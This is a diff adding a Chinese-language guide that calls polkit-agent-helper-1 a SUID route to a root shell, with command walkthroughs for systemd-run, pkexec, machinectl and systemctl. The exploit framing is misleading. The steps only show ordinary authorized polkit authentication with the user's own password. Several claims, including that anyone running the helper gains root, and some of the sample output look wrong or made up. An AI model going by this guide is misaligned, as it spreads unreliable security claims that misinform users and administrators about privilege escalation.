@@ -1,0 +1,91 @@
+
+这是一种典型的利用 `/usr/lib/policykit-1/polkit-agent-helper-1` SUID 二进制提权到 root 的流程，以 `systemd-run` 为例（如果你的系统没有 `systemd-run`，也可以用其它会触发 polkit 身份验证的命令，比如 `pkexec`、`machinectl shell`、`dbus-send` 调用重启服务等）。
+
+## 原理简述
+
+1. **SUID 二进制**
+   `/usr/lib/policykit-1/polkit-agent-helper-1` 带有 SUID，意味着任何执行它的进程都能暂时以 root 身份运行。
+2. **polkit 身份验证流程**
+   当调用诸如 `systemd-run`、`pkexec` 等需要提升权限的工具时，polkit 会拦截并调用上述 helper，并在 helper 中再行验证用户密码，验证通过即以 root 权限执行后续动作。
+3. **最终拿到 root shell**
+   只要后续动作是一个交互式 shell，就能够直接以 root 身份进入系统。
+
+
+## 1. 确认 `polkit-agent-helper-1` 的 SUID 属性
+
+```bash
+$ ls -l /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 60240 Jan 10 12:34 /usr/lib/policykit-1/polkit-agent-helper-1
+```
+
+可以看到它的所有者是 root，并且带有 `s` 标志（SUID），说明任何人执行它时都会以 root 身份运行。
+
+---
+
+## 2. 触发一次需要 polkit 验证的高权限操作
+
+我们用 `systemd-run` 启动一个 new scope、并在其中跑一个交互式 bash：
+
+```bash
+$ systemd-run --unit=exploit --scope /bin/bash
+Running as unit: exploit.scope
+Press Enter for password prompt...
+```
+
+此时，polkit 会拦截这次请求，弹出密码输入提示。
+
+---
+
+## 3. 输入目标用户密码完成验证
+
+当出现以下提示时，输入当前登录用户（示例中为 `norris`）的密码：
+
+```
+Authenticate as user 'norris' to start transient service
+Password:
+```
+
+验证通过后，`systemd` 会在一个新的 scope（exploit.scope）中以 root 权限启动 bash：
+
+```bash
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+此时你已经获得了一个真正的 root shell。
+
+---
+
+## 4. 可选：没有 `systemd-run` 时的替代方案
+
+* **`pkexec`**
+
+  ```bash
+  $ pkexec /bin/bash
+  Password for norris:
+  # id
+  ```
+* **`machinectl shell`**（在启用了 `machinectl` 的环境）
+
+  ```bash
+  $ machinectl shell root@.
+  Password for norris:
+  # id
+  ```
+* **重启某个服务**
+
+  ```bash
+  $ systemctl restart sshd.service
+  Authenticate as 'norris':
+  ```
+
+  只要该操作需要 polkit 验证，都会同样触发 `polkit-agent-helper-1`。
+
+---
+
+
+
+**重要提醒**：
+
+* 利用此方式前，请确保你所处环境确实存在带 SUID 的 `polkit-agent-helper-1`，并且你的用户在 polkit policy 中有执行相应操作的权限。
+* 在真实系统中，很多发行版已修复相关漏洞，并且默认不会把 helper 设为 SUID，或者会限制哪些用户／组能触发。更新到最新补丁或审计策略是最佳的防御措施。
